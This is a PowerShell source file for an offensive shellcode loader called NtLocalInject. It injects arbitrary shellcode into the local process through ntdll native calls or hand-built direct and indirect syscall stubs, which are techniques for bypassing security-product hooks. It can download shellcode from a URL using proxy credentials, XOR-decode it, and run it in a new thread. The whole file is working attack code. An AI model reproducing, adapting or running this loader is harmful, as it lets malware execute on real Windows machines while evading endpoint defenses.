function NtLocalInject {
#.SYNOPSIS
# Local Process Injection via ntdll.dll and Direct/Indirect Syscalls
# Author: Tyler McCann (@tylerdotrar)
# 
#.DESCRIPTION
# Dynamic Syscall Resolution & Invocation of:
#  |__ NtAllocateVirtualMemory()
#  |__ NtWriteVirtualMemory()
#  |__ NtProtectVirtualMemory()
#  |__ NtCreateThreadEx()
#  |__ NtWaitForSingleObject()
#
# Avoids RWX memory and works in both Desktop PowerShell and PowerShell Core (x64).
#
# Parameters:
#  -Shellcode        -->  Target shellcode to execute (e.g., string, array, URI).
#  -DirectSyscall    -->  Inject via direct syscalls instead of ntdll.dll.
#  -IndirectSyscall  -->  Inject via indirect syscalls instead of ntdll.dll.
#  -XorKey           -->  Optional: XOR decoding key for shellcode.
#  -UseProxy         -->  Optional: Use default proxy credentials for URI shellcode.
#  -Help             -->  Return Get-Help information.
#
#.LINK
# https://github.com/tylerdotrar/ShellcodeLoaderPS
# https://github.com/tylerdotrar/NtLocalInject


    Param(
        $Shellcode,
        [Switch]$DirectSyscall,
        [Switch]$IndirectSyscall,
        [UInt32]$XorKey,
        [Switch]$UseProxy,
        [Switch]$Help
    )


    # Return Help
    if ($Help) { return (Get-Help NtLocalInject) }


    # Error Correction
    if (!$Shellcode)     { return (Write-Host '[!] Error! Missing shellcode.' -ForegroundColor Red) }
    if ($XorKey -gt 255) { return (Write-Host '[!] Error! XOR key cannot be greater than 0xFF (255).' -ForegroundColor Red) }


    # Internal Function(s)
    function Format-ByteArray ($Shellcode, [UInt32]$XorKey, [Bool]$UseProxy) {

        Write-Host '[!] Formatting shellcode for PowerShell...' -ForegroundColor Yellow

        if ($Shellcode -is [array]) {
            if ($Shellcode -is [Byte[]]) {
                Write-Host ' o  Shellcode parameter is already formatted as a [byte[]].' -ForegroundColor Yellow
                Write-Host ' o  --> No formatting required.'
                $shellcodeBuffer = $Shellcode
            }
            else {
                Write-Host ' o  Shellcode parameter is an [array].'
                Write-Host ' o  --> Converting to [string]...'
                $Shellcode = $Shellcode -join ''
            }
        }

        if ($Shellcode -is [uri]) {
            Write-Host ' o  Shellcode parameter is a [uri].'
            Write-Host ' o  --> Converting to [string]...'
            $Shellcode = $Shellcode.AbsoluteUri
        }

        if ($Shellcode -is [String]) {
            $Shellcode = $Shellcode.Replace("`r","").Replace("`n",'')
            if (Test-Path -LiteralPath $Shellcode 2>$NULL) {
                Write-Host ' o  Shellcode [string] is a path to a file.'
                $ShellcodePath   = (Get-Item -LiteralPath $Shellcode).Fullname
                $shellcodeBuffer = [System.IO.File]::ReadAllBytes($ShellcodePath)
                Write-Host " o  --> Path : $ShellcodePath"
                Write-host ' o  --> Reading file bytes...'
            }
            elseif ($Shellcode -match "^(http://|https://)") {
                Write-Host ' o  Shellcode [string] is a URI.'
                Write-Host " o  --> URI : $Shellcode"
                Write-Host ' o  --> Downloading data...'
                Try {
                    if ($UseProxy) {
                        $WebClient     = [Net.WebClient]::new()
                        $Proxy         = [Net.WebProxy]::new()
                        $Proxy.Address = ([Net.WebRequest]::DefaultWebProxy.GetProxy($Shellcode)).AbsoluteUri
                        $Proxy.UseDefaultCredentials = $TRUE
                        $WebClient.Proxy = $Proxy
                        $ShellcodeBuffer = $WebClient.DownloadData($Shellcode)
                    }
                    else { $ShellcodeBuffer = [Net.WebClient]::new().DownloadData($Shellcode) }
                } 
                Catch { return (Write-Host '[!] Error! Remote server returned an error!' -ForegroundColor Red) }
            }
            elseif (($Shellcode -like 'b"\x*') -or ($Shellcode -like '\x*')) {
                Write-Host ' o  Shellcode [string] is formatted for C or Python.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('b"','').Replace('"','')).Split('\')[1..$Shellcode.Length]
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_.Replace('x',''),16) })
            }
            elseif (($Shellcode -like '{0x*') -or ($Shellcode -like '{ 0x*')) {
                Write-Host '[!] Formatting Shellcode for PowerShell:' -ForegroundColor Yellow
                Write-Host ' o  Shellcode [string] is formatted for C++ or C#.'
                Write-Host ' o  --> Formatting for PowerShell...'
                $Shellcode       = $Shellcode.Replace(' ','')
                $psShellcode     = ($Shellcode.Replace('{0x','').Replace('}','')) -Split ',0x'
                $shellcodeBuffer = [byte[]]($psShellcode | % { [convert]::ToByte($_,16) })
            }
            else { return (Write-Host '[!] Error! Unable to determine shellcode langauge format.' -ForegroundColor Red) }
        }

        if (!$shellcodeBuffer) { return (Write-Host '[!] Error! Unable to determine shellcode type.' -ForegroundColor Red) }
        Write-Host " o  --> Shellcode Length : $($shellcodeBuffer.Length) bytes"
        
        if ($XorKey) {
            Write-Host '[!] Applying XOR Cipher to Shellcode:' -ForegroundColor Yellow
            Write-Host " o  --> XOR Cipher Key : $('0x{0:X2}' -f ${XorKey}) (${XorKey})"
            for ($i = 0; $i -lt $ShellcodeBuffer.Length; $i++) {
                $ShellcodeBuffer[$i] = $ShellcodeBuffer[$i] -bxor $XorKey
            }
        }

        return ,$shellcodeBuffer
    }
    function Load-Win32Function ([string]$Library, [string]$FunctionName, [IntPtr]$FunctionAddress, [type[]]$ParamTypes = @($null), [type]$ReturnType = [Void]) {

        if ($FunctionAddress) { $Library = 'stub'}
        else {
            Try {
                if ($PSVersionTable.PSEdition -eq 'Core') {
                    $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                    if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                    $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                    if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
                }
                else {
                    $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                    $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                    $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                    $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                    $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                    if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                    $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                    if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
                }
            }
            Catch { return Generic-Error }
        }
         
        foreach ($Assembly in [AppDomain]::CurrentDomain.GetAssemblies()) {
            $CustomType = $Assembly.GetType($FunctionName, $False)
            if ($CustomType -ne $NULL) {
                $FunctionDelegate = $CustomType
                break
            }
        }

        if (!$FunctionDelegate) {
            Try {
                $DynAssembly        = [System.Reflection.AssemblyName]::new([guid]::NewGuid().ToString())
                $AssemblyBuilder    = [System.Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder      = $AssemblyBuilder.DefineDynamicModule([guid]::NewGuid().ToString())
                $TypeBuilder        = $ModuleBuilder.DefineType($FunctionName, 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
                $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([Object], [IntPtr])) 
                $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
                $MethodBuilder      = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $ParamTypes)
                $MethodBuilder.SetImplementationFlags('Runtime, Managed')
                $FunctionDelegate   = $TypeBuilder.CreateType()
            }
            Catch { return Generic-Error }
        }

        Write-Host ' o  Function ' -NoNewline ; Write-Host "'${Library}!${FunctionName}()'" -NoNewline -ForegroundColor Green ; Write-Host ' loaded into session.'
        return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FunctionAddress, $FunctionDelegate)
    }
    function Syscall-Resolver ([string]$FunctionName, [array]$FunctionArray, [switch]$Indirect) {

        if ($Indirect) { $InvokeMethod = 'Indirect Syscall' }
        else           { $InvokeMethod = 'Direct Syscall'   }
        
        if (!$FunctionArray) { $FunctionArray = @() ; $FunctionArray += $FunctionName }

        $Library = 'ntdll.dll'
        $SyscallStub = @()
        $SyscallIDs  = @()
        $SyscallPtrs = @()

        Write-Host '[!] Syscall Resolution:' -ForegroundColor Yellow

        foreach ($FunctionName in $FunctionArray) {

            Try {
                if ($PSVersionTable.PSEdition -eq 'Core') {
                    $LibraryHandle   = [System.Runtime.InteropServices.NativeLibrary]::Load($Library)
                    if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                    $FunctionAddress = [System.Runtime.InteropServices.NativeLibrary]::GetExport($LibraryHandle, $FunctionName)
                    if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
                }
                else {
                    $SystemAssembly  = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -and ($_.Location -like '*\System.dll') }
                    $UnsafeMethods   = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
                    $GetModuleHandle = $UnsafeMethods.GetMethod('GetModuleHandle', [type[]]('System.String'))
                    $GetProcAddress  = $UnsafeMethods.GetMethod('GetProcAddress',  [type[]]('IntPtr','System.String'))
                    $LibraryHandle   = $GetModuleHandle.Invoke($Null, @($Library))
                    if (($LibraryHandle -eq 0)   -or ($LibraryHandle -eq $NULL))   { return (Write-Host "[!] Error! Null handle to target library '${Library}'." -ForegroundColor Red) }
                    $FunctionAddress = $GetProcAddress.Invoke($Null, @($LibraryHandle, $FunctionName))
                    if (($FunctionAddress -eq 0) -or ($FunctionAddress -eq $NULL)) { return (Write-Host "[!] Error! Unable to find address to target function '${FunctionName}'." -ForegroundColor Red) }
                }
            }
            Catch { return Generic-Error }

            $lpBuffer = [Array]::CreateInstance([byte],0x15) # Buffer to receive contents 
            [Runtime.InteropServices.Marshal]::Copy($FunctionAddress, $lpBuffer, 0, $lpBuffer.Length)

            $SyscallPointer  = ($FunctionAddress -as [Int64]) + 0x12 # Static 18-byte offset
            $SyscallPtrBytes = [BitConverter]::GetBytes($SyscallPointer)
            $SSN             = [BitConverter]::ToUInt32($lpBuffer, 4)

            $Stub  = @(0x49, 0x89, 0xCA)                 # mov r10, rcx
            $Stub += @(0xB8) + $lpBuffer[4..7]           # mov eax, <syscall_id>
            if ($Indirect) {
                $Stub += @(0x49,0xBB) + $SyscallPtrBytes # mov r11, <syscall_addr>
                $Stub += @(0x41,0xFF,0xE3)               # jmp r11
            }
            else {
                $Stub += @(0x0F, 0x05)                   # syscall
                $Stub += @(0xC3)                         # ret
            }

            $SyscallStub += @($Stub + 0x90) # NOP as single byte stub delimiter (for fun)
            $SyscallIDs  += $SSN
            $SyscallPtrs += $SyscallPointer

            Write-Host " o  Native Function : " -NoNewline ; Write-Host "${Library}!${FunctionName}()" -ForegroundColor Green
            Write-Host " o  --> Function Address : $(Print-Hex -Integer $FunctionAddress)"
            if ($Indirect) { Write-Host " o  --> Syscall Pointer  : $(Print-Hex -Integer $SyscallPointer)" }
            Write-Host " o  --> Syscall ID       : " -NoNewline ; Write-Host $(Print-Hex -Integer $SSN) -ForegroundColor Red
        }

        # Visually format syscall stub
        Write-Host "[!] Shellcode Stub (per Syscall):" -ForegroundColor Yellow
        Write-Host " o // --- //"
        Write-Host "    " -NoNewline ; Write-Host "; ${InvokeMethod}" -ForegroundColor Green
        if ($Indirect) {
            Write-Host "    0x49 0x89 0xca                                     " -NoNewline ; Write-Host "; mov r10, rcx" -ForegroundColor Green
            Write-Host "    0xb8 " -NoNewline ; Write-Host "0xxx 0xxx " -NoNewline -ForegroundColor Red ; Write-Host "0x00 0x00                           " -NoNewline ; Write-Host "; mov eax, <syscall_id>" -ForegroundColor Green
            Write-Host "    0x49 0xbb " -NoNewline ; Write-Host "0xxx 0xxx 0xxx 0xxx 0xxx 0xxx " -NoNewline -ForegroundColor Red ; Write-Host "0x00 0x00  " -NoNewline ; Write-Host "; mov r11, <syscall_ptr>" -ForegroundColor Green
            Write-Host "    0x41 0xff 0xe3                                     " -Nonewline ; Write-Host "; jmp r11" -ForegroundColor Green
        }
        else {
            Write-Host "    0x49 0x89 0xca            " -NoNewline ; Write-Host "; mov r10, rcx" -ForegroundColor Green
            Write-Host "    0xb8 " -NoNewline ; Write-Host "0xxx 0xxx " -NoNewline -ForegroundColor Red ; Write-Host "0x00 0x00  " -NoNewline ; Write-Host "; mov eax, <syscall_id>" -ForegroundColor Green
            Write-Host "    0x0f 0x05                 " -NoNewline ; Write-Host "; syscall" -ForegroundColor Green
            Write-Host "    0xc3                      " -NoNewline ; Write-Host "; ret" -ForegroundColor Green
        }
        Write-Host " o // --- //"

        return $SyscallStub
    }
    function Allocate-Stub ([byte[]]$ByteArray) {

        Write-Host "[!] Allocating stub into current process memory..." -ForegroundColor Yellow
        # Note: Marshal.AllocHGlobal()/Copy() + VirtualProtect() requires PAGE_EXECUTE_READWRITE protections.

        $VirtualAllocArgs = @([IntPtr], [UInt32], [UInt32], [UInt32])
        $VirtualAlloc = Load-Win32Function -Library "kernel32.dll" -FunctionName "VirtualAlloc" -ParamTypes $VirtualAllocArgs -ReturnType ([IntPtr])

        Try   { $StubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $ByteArray.Length, ($MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE), $MemoryProtection.PAGE_READWRITE) }
        Catch { return Generic-Error }
        if ($StubAddress -eq 0) { return Win32-Error }
        Write-Host " o  --> Allocated Buffer Address : $(Print-Hex $StubAddress)"
        Write-Host " o  --> Buffer Memory Protection : $(Print-Hex $MemoryProtection.PAGE_READWRITE) (PAGE_READWRITE)"

        $RtlCopyMemoryArgs = @([IntPtr], [Byte[]], [UInt32])
        $RtlCopyMemory = Load-Win32Function -Library "kernel32.dll" -FunctionName "RtlCopyMemory" -ParamTypes $RtlCopyMemoryArgs -ReturnType ([Bool])

        Try   { $MemoryCopied = $RtlCopyMemory.Invoke($StubAddress, $ByteArray, $ByteArray.Length) }
        Catch { return Generic-Error }
        if (!$MemoryCopied) { return Win32-Error }
        Write-Host " o  --> Target Buffer Size : $($ByteArray.Length)"

        $VirtualProtectArgs = @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
        $VirtualProtect = Load-Win32Function -Library "kernel32.dll" -FunctionName "VirtualProtect" -ParamTypes $VirtualProtectArgs -ReturnType ([Bool])

        Try   { $Success = $VirtualProtect.Invoke($StubAddress, $ByteArray.Length, $MemoryProtection.PAGE_EXECUTE_READ, [ref]$NULL) }
        Catch { return Generic-Error }
        if (!$Success) { return Win32-Error }
        Write-Host " o  --> Buffer Memory Protection : $(Print-Hex $MemoryProtection.PAGE_EXECUTE_READ) (PAGE_EXECUTE_READ)"

        return $StubAddress
    }
    function Print-Hex ($Integer) {
        return ('0x{0:x}' -f $Integer)
    }
    function Generic-Error() {
        Write-Host "[!] Unexpected error occured! Return details:" -ForegroundColor Red
        $Error[0]
        $_.Exception | Select-Object -Property ErrorRecord,Source,HResult | Format-List
        $_.InvocationInfo | Select-Object -Property PSCommandPath,ScriptLineNumber,Statement | Format-List
        return
    }
    function Win32-Error() {
        return (Write-Host " o  --> Failure! Last Win32 Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red)
    }



    # Define Required Constant(s)
    $MemoryAllocation = @{
        MEM_COMMIT  = 0x00001000;
        MEM_RESERVE = 0x00002000;
    }
    $MemoryProtection = @{
        PAGE_READWRITE    = 0x04;
        PAGE_EXECUTE_READ = 0x20;
    }
    $ThreadAccess = @{
        THREAD_ALL_ACCESS = 0x000F0000 -bor 0x00100000 -bor 0x3FF; # STANDARD_RIGHTS_REQUIRED|SYNCHRONIZE|0x3FF
    }


    # Load Required Win32 API Call(s)
    Try {
        
        $NtAllocateVirtualMemoryArgs = @(
            [IntPtr],                 # ProcessHandle
            [IntPtr].MakeByRefType()  # BaseAddress
            [UInt32],                 # ZeroBits
            [UInt32].MakeByRefType(), # RegionSize
            [UInt32],                 # AllocationType
            [UInt32]                  # Protect
        )
        $NtWriteVirtualMemoryArgs = @(
            [IntPtr],                 # ProcessHandle
            [IntPtr],                 # BaseAddress
            [Byte[]],                 # Buffer
            [UInt32],                 # NumberOfBytesToWrite
            [UInt32].MakeByRefType()  # NumberOfBytesWritten
        )
        $NtProtectVirtualMemoryArgs = @(
            [IntPtr],                 # ProcessHandle
            [IntPtr].MakeByRefType(), # BaseAddress
            [UInt32].MakeByRefType(), # RegionSize
            [UInt32],                 # NewProtect
            [UInt32].MakeByRefType()  # OldProtect
        )
        $NtCreateThreadExArgs = @(
            [IntPtr].MakeByRefType(), # ThreadHandle
            [UInt32],                 # DesiredAccess
            [IntPtr],                 # ObjectAttributes
            [IntPtr],                 # ProcessHandle
            [IntPtr],                 # StartRoutine
            [IntPtr],                 # Argument
            [UInt32],                 # CreateFlags
            [UInt32],                 # ZeroBits
            [UInt32],                 # StackSize
            [UInt32],                 # MaxStackSize
            [IntPtr]                  # AttributeList
        )
        $NtWaitForSingleObjectArgs = @(
            [IntPtr],                 # Handle
            [Bool],                   # Alertable
            [IntPtr]                  # Timeout
        )

        $Syscalls = @(
            [PSCustomObject]@{ Name = 'NtAllocateVirtualMemory' ; ArgTypes = $NtAllocateVirtualMemoryArgs },
            [PSCustomObject]@{ Name = 'NtWriteVirtualMemory'    ; ArgTypes = $NtWriteVirtualMemoryArgs    },
            [PSCustomObject]@{ Name = 'NtProtectVirtualMemory'  ; ArgTypes = $NtProtectVirtualMemoryArgs  },
            [PSCustomObject]@{ Name = 'NtCreateThreadEx'        ; ArgTypes = $NtCreateThreadExArgs        },
            [PSCustomObject]@{ Name = 'NtWaitForSingleObject'   ; ArgTypes = $NtWaitForSingleObjectArgs   }
        )

        # Inject & dynamically load syscall stub(s) into local process
        if ($DirectSyscall -or $IndirectSyscall) {
                    
            if ($IndirectSyscall)   { $SyscallStub = Syscall-Resolver -FunctionArray $Syscalls.Name -Indirect }
            elseif ($DirectSyscall) { $SyscallStub = Syscall-Resolver -FunctionArray $Syscalls.Name } 

            $StubAddress = Allocate-Stub -ByteArray $SyscallStub

            Write-Host '[!] Loading syscalls via allocated stub...' -ForegroundColor Yellow

            for ($i = 0; $i -lt $Syscalls.Count; $i++) {
                       
                $Syscall = $Syscalls[$i]

                if ($IndirectSyscall)   { $AddrOffSet = ($i * 22) } # Indirect stub is 21 bytes per syscall + NOP delimiter
                elseif ($DirectSyscall) { $AddrOffSet = ($i * 12) } # Direct stub is 11 bytes per syscall + NOP delimiter

                Set-Variable -Name $Syscall.Name -Value (
                    Load-Win32Function `
                        -FunctionName    $Syscall.Name `
                        -FunctionAddress ([IntPtr]($StubAddress.ToInt64() + $AddrOffset)) `
                        -ParamTypes      $Syscall.Argtypes `
                        -ReturnType      ([UInt32]) # NTSTATUS
                )
            }
        }

        # Load directly from ntdll.dll
        else {

            Write-Host '[!] Loading Win32 API calls...' -ForegroundColor Yellow
            for ($i = 0; $i -lt $Syscalls.Count; $i++) {
                
                $Syscall = $Syscalls[$i]

                Set-Variable -Name $Syscall.Name -Value (
                    Load-Win32Function `
                        -Library         "ntdll.dll" `
                        -FunctionName    $Syscall.Name `
                        -ParamTypes      $Syscall.ArgTypes `
                        -ReturnType      ([UInt32]) # NTSTATUS
                )
            }
        }
    }
    Catch { return Generic-Error }


    # Initialize Key Variable(s)
    [byte[]]$ShellcodeBuffer = Format-ByteArray $Shellcode -XorKey $XorKey -UseProxy $UseProxy
    if ($ShellcodeBuffer -isnot [byte[]]) { return }


    # // Main // #


    # Allocate Memory > https://ntdoc.m417z.com/ntallocatevirtualmemory
    Write-Host "[!] Allocating virtual memory..." -ForegroundColor Yellow
    Write-Host " o  " -NoNewline ; Write-Host "NtAllocateVirtualMemory()" -ForegroundColor Green
    
    $ProcessHandle  = [IntPtr](-1)    # Pseudo-handle to local proces
    $BaseAddress    = [IntPtr]::Zero  # Dynamically determine base address
    $ZeroBits       = 0 
    $RegionSize     = $ShellcodeBuffer.Length
    $AllocationType = $MemoryAllocation.MEM_COMMIT -bor $MemoryAllocation.MEM_RESERVE
    $PageProtection = $MemoryProtection.PAGE_READWRITE

    Try   { $NTSTATUS = $NtAllocateVirtualMemory.Invoke($ProcessHandle, [ref]$BaseAddress, $ZeroBits, [ref]$RegionSize, $AllocationType, $PageProtection) }
    Catch { return Generic-Error }

    if ($NTSTATUS -ne 0) { return Win32-Error }
    Write-Host " o  --> Allocation Base Address : $(Print-Hex $BaseAddress)"
    Write-Host " o  --> Region Size             : ${RegionSize}"
    Write-Host " o  --> Memory Protection       : 0x04 (PAGE_READWRITE)"


    # Write Memory > https://ntdoc.m417z.com/ntwritevirtualmemory
    Write-Host "[!] Copying memory to allocated buffer..." -ForegroundColor Yellow
    Write-Host " o  " -NoNewline ; Write-Host "NtWriteVirtualMemory()" -ForegroundColor Green 

    $ProcessHandle        = [IntPtr](-1) # Psuedo-handle to local process
    $BaseAddress          = $BaseAddress # Address acquired from NtAllocateVirtualMemory()
    $Buffer               = $ShellcodeBuffer
    $NumberOfBytesToWrite = $ShellcodeBuffer.Length
    $NumberOfBytesWritten = 0

    Try   { $NTSTATUS = $NtWriteVirtualMemory.Invoke($ProcessHandle, $BaseAddress, $Buffer, $NumberOfBytesToWrite, [ref]$NumberOfBytesWritten) }
    Catch { return Generic-Error }

    if ($NTSTATUS -ne 0) { return Win32-Error }
    Write-Host " o  --> Shellcode Buffer Size   : ${NumberOfBytesToWrite}"
    Write-Host " o  --> Number of Bytes Written : ${NumberOfBytesWritten}"


    # Memory Protection > https://ntdoc.m417z.com/ntprotectvirtualmemory
    Write-Host "[!] Making allocated memory executable..." -ForegroundColor Yellow
    Write-Host " o  " -NoNewline ; Write-Host "NtProtectVirtualMemory()" -ForegroundColor Green
    
    $ProcessHandle = [IntPtr](-1)    # Pseudo-handle to local proces
    $BaseAddress   = $BaseAddress    # Acquired from NtAllocateVirtualMemory()
    $RegionSize    = $ShellcodeBuffer.Length
    $NewProtect    = $MemoryProtection.PAGE_EXECUTE_READ
    $OldProtect    = 0

    Try   { $NTSTATUS = $NtProtectVirtualMemory.Invoke($ProcessHandle, [ref]$BaseAddress, [ref]$RegionSize, $NewProtect, [ref]$OldProtect) }
    Catch { return Generic-Error }

    if ($NTSTATUS -ne 0) { return Win32-Error }
    Write-Host " o  --> Allocation Base Address : $(Print-Hex $BaseAddress)"
    Write-Host " o  --> Region Size             : ${RegionSize}"
    Write-Host " o  --> Memory Protection       : 0x20 (PAGE_EXECUTE_READ)"


    # Create Thread > https://ntdoc.m417z.com/ntcreatethreadex
    Write-Host "[!] Creating thread to executable buffer..." -ForegroundColor Yellow
    Write-Host " o  " -NoNewline ; Write-Host "NtCreateThreadEx()" -ForegroundColor Green

    $ThreadHandle     = [IntPtr]::Zero # Return value
    $DesiredAccess    = $ThreadAccess.THREAD_ALL_ACCESS
    $ObjectAttributes = [IntPtr]::Zero # Not using OBJECT_ATTRIBUTES struct
    $ProcessHandle    = [IntPtr](-1)   # Pseudo-handle to local process
    $StartRoutine     = $BaseAddress   # Acquired from NtAllocateVirtualMemory() 
    $Argument         = [IntPtr]::Zero
    $CreateFlags      = 0
    $ZeroBits         = 0
    $StackSize        = 0 
    $MaxStackSize     = 0 
    $AttributeList    = [IntPtr]::Zero # Not using PS_ATTRIBUTE struct

    Try   { $NTSTATUS = $NtCreateThreadEx.Invoke([ref]$ThreadHandle, $DesiredAccess, $ObjectAttributes, $ProcessHandle, $StartRoutine, $Argument, $CreateFlags, $ZerBits, $StackSize, $MaxStackSize, $AttributeList)}
    Catch { return Generic-Error }

    if ($NTSTATUS -ne 0) { return Win32-Error }
    Write-Host " o  --> Thread Handle : $(Print-Hex $ThreadHandle)"
    Write-Host " o  --> Thread Access : 0x1F03FF (THREAD_ALL_ACCESS)"


    # Wait > https://ntdoc.m417z.com/ntwaitforsingleobject
    Write-Host "[!] Waiting for thread signal..." -ForegroundColor Yellow
    Write-Host " o  " -NoNewline ; Write-Host "NtWaitForSingleObject()" -ForegroundColor Green

    $Handle    = $ThreadHandle  # Acquired from NtCreateThreadEx()
    $Alertable = $FALSE         # Only required for APC-based execution
    $Timeout   = [IntPtr]::Zero # Indicates infinite wait until signal

    Try   { $NTSTATUS = $NtWaitForSingleObject.Invoke($Handle, $Alertable, $Timeout) }
    Catch { return Generic-Error }

    #if ($NTSTATUS -ne 0) { return Win32-Error }
    Write-Host " o  --> NTSTATUS : $(Print-Hex $NTSTATUS)" # Should still execute even if non-zero
}